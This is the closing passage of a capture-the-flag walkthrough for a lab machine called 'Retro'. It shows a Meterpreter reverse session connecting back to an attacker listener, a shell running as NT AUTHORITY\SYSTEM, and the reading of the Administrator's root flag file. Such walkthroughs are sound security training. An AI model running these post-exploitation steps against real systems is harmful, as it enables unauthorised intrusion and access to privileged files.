[*] Meterpreter session 2 opened (10.4.119.29:4444 -> 10.10.234.200:49877) at 2025-03-22 22:47:31 +1100

meterpreter >
```
{% endraw %}

<br />
Drop into a shell and confirm who we are.

{% raw %}
```bash
meterpreter > shell
Process 4372 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
{% endraw %}

<br />
Get the root.txt.txt flag.

{% raw %}
```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt.txt
type C:\Users\Administrator\Desktop\root.txt.txt
<redacted>
C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::6982:d717:458b:9e24%5
   IPv4 Address. . . . . . . . . . . : 10.10.234.200
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:2815:27b8:f5f5:1537
   Link-local IPv6 Address . . . . . : fe80::2815:27b8:f5f5:1537%2
   Default Gateway . . . . . . . . . : ::

Tunnel adapter isatap.eu-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
```
{% endraw %}

<br />
Hopefully, you enjoyed the retro look at the box, Retro.  I will see you in the next one.